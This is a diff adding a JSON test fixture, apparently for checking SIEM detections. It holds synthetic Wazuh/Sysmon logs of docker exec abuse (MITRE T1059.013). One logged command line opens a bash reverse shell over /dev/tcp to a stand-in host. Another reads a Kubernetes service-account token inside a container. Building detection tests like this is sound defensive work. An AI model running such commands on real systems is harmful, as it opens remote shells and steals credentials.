@@ -1,0 +1,140 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.013",
+    "variation": "001",
+    "name": "Container CLI - docker exec",
+    "description": "Adversary uses docker exec to execute commands inside containers",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Linux Sysmon Event 1 - docker exec reverse shell",
+      "sequence": 1,
+      "timestamp": "2026-02-08T15:05:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T15:05:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1059.013"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Command and Scripting Interpreter: Container CLI/API"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300028",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 15:05:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1059-0013-000000000001}",
+            "processId": "34012",
+            "image": "/usr/bin/docker",
+            "commandLine": "docker exec -it webapp-prod /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.110/4444 0>&1'",
+            "currentDirectory": "/home/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1059-0013-PARENT000001}",
+            "parentProcessId": "34000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.013",
+        "_fomorian_expected_detection": "Sigma: Docker Exec Reverse Shell (T1059.013)"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - docker exec credential dumping",
+      "sequence": 2,
+      "timestamp": "2026-02-08T15:06:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T15:06:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1059.013"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Command and Scripting Interpreter: Container CLI/API"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300029",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 15:06:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1059-0013-000000000002}",
+            "processId": "34056",
+            "image": "/usr/bin/docker",
+            "commandLine": "docker exec db-mysql cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+            "currentDirectory": "/home/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1059-0013-PARENT000002}",
+            "parentProcessId": "34000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.013",
+        "_fomorian_expected_detection": "Sigma: Docker Exec Secret Access (T1059.013)"
+      }
+    }
+  ]
+}
